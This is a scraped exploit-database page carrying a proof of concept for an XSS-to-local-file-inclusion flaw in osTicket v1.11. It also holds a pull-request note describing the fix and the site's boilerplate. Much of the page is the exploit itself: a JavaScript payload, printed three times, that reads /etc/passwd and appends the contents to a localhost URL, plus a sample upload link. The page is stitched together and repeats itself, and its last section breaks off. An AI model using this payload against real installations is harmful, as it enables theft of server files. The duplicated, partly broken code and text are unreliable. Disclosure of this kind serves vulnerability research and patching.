## osTicket v1.11 XSS to LFI Vulnerability

There are two different XSS vulnerabilities in the "Import" field on the Agent Panel - User Directory field.
This vulnerability causes a different vulnerability.
The attacker can run the malicious JS file that he uploads in the XSS vulnerability.
Uploaded JS files can be called clear text. Therefore, attackers do not have to use a different server to perform an attack.
Then it is possible to create "Local File Inclusion" vulnerability too.The attacker can upload a JS file as follows.
```

function readTextFile(file)
{
    var rawFile = new XMLHttpRequest();
    rawFile.open("GET", file, false);
    rawFile.onreadystatechange = function ()
    {
        if(rawFile.readyState === 4)
        {
            if(rawFile.status === 200 || rawFile.status == 0)
            {
                var allText = rawFile.responseText;
                allText.src = 'http://localhost:8001' + rawFile.responseText;
                document.body.appendChild(allText);
            }
        }
    }
    rawFile.send(null);
}

readTextFile("/etc/passwd");

This addresses a vulnerability found by [AkkuS](https://pentest.com.tr) where a simple XSS attempt can lead to an LFI (Local File Inclusion) attack. The issue stems from the system returning the unformatted file contents in an error message when uploading a CSV to the User Importer. This formats the contents before uploading so that if the contents are returned in an error message they will not be executed by the browser which therefore prevents XSS attempts and the possibility of an LFI attack. This also formats all the user-created data sent to ImportError to prevent the same issue.

Sorry, something went wrong.

# Contact: https://pentest.com.tr
# Vendor Homepage: https://osticket.com
# Software Link: https://github.com/osTicket/osTicket
# References: https://github.com/osTicket/osTicket/pull/4869
#             https://pentest.com.tr/exploits/osTicket-v1-11-XSS-to-LFI.html
# Version: v1.11
# Category: Webapps
# Tested on: XAMPP for Linux
# Description: This is exploit proof of concept as XSS attempt can
# lead to an LFI (Local File Inclusion) attack at osTicket.
##################################################################
# PoC

# There are two different XSS vulnerabilities in the "Import"
field on the Agent Panel - User Directory field. This vulnerability
causes a different vulnerability. The attacker can run the malicious
JS file that he uploads in the XSS vulnerability. Uploaded JS files
can be called clear text. Therefore, attackers do not have to use
a different server to perform an attack. Then it is possible to
create "Local File Inclusion" vulnerability too.

The attacker can upload a JS file as follows.
------------------------------------------------------------------

function readTextFile(file)
{
    var rawFile = new XMLHttpRequest();
    rawFile.open("GET", file, false);
    rawFile.onreadystatechange = function ()
    {
        if(rawFile.readyState === 4)
        {
            if(rawFile.status === 200 || rawFile.status == 0)
            {
                var allText = rawFile.responseText;
                allText.src = 'http://localhost:8001' +
rawFile.responseText;
                document.body.appendChild(allText);
            }
        }
    }
    rawFile.send(null);
}

readTextFile("/etc/passwd");

------------------------------------------------------------------

# Smilar JS File Link;

/upload/file.php?key=y3cxcoxqv8r3miqczzj5ar8rhm1bhcbm
&expires=1554854400&signature=be5cea87c37d7971e0c54164090a391066ecbaca&id=36"

After this process, we can run the JS file in XSS vulnerability.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Exploit Title: osTicket v1.11 - Cross-Site Scripting to Local File
Inclusion
# Date: 09.04.2019
# Exploit Author: Özkan Mustafa Akkuş (AkkuS) @ehakkus
# Contact: https://pentest.com.tr
# Vendor Homepage: https://osticket.com
# Software Link: https://github.com/osTicket/osTicket
# References: https://github.com/osTicket/osTicket/pull/4869
#             https://pentest.com.tr/exploits/osTicket-v1-11-XSS-to-LFI.html
# Version: v1.11
# Category: Webapps
# Tested on: XAMPP for Linux
# Description: This is exploit proof of concept as XSS attempt can
# lead to an LFI (Local File Inclusion) attack at osTicket.
##################################################################
# PoC

# There are two different XSS vulnerabilities in the "Import"
field on the Agent Panel - User Directory field. This vulnerability
causes a different vulnerability. The attacker can run the malicious
JS file that he uploads in the XSS vulnerability. Uploaded JS files
can be called clear text. Therefore, attackers do not have to use
a different server to perform an attack. Then it is possible to
create "Local File Inclusion" vulnerability too.

The attacker can upload a JS file as follows.
------------------------------------------------------------------

function readTextFile(file)
{
    var rawFile = new XMLHttpRequest();
    rawFile.open("GET", file, false);
    rawFile.onreadystatechange = function ()
    {
        if(rawFile.readyState === 4)
        {
            if(rawFile.status === 200 || rawFile.status == 0)
            {
                var allText = rawFile.responseText;
                allText.src = 'http://localhost:8001' +
rawFile.responseText;
                document.body.appendChild(allText);
            }
        }
    }
    rawFile.send(null);
}

readTextFile("/etc/passwd");

------------------------------------------------------------------

# Smilar JS File Link;

/upload/file.php?key=y3cxcoxqv8r3miqczzj5ar8rhm1bhcbm
&expires=1554854400&signature=be5cea87c37d7971e0c54164090a391066ecbaca&id=36"

After this process, we can run the JS file in XSS vulnerability.

# Our First Request for XSS to LFI;
------------------------------------------------------------------
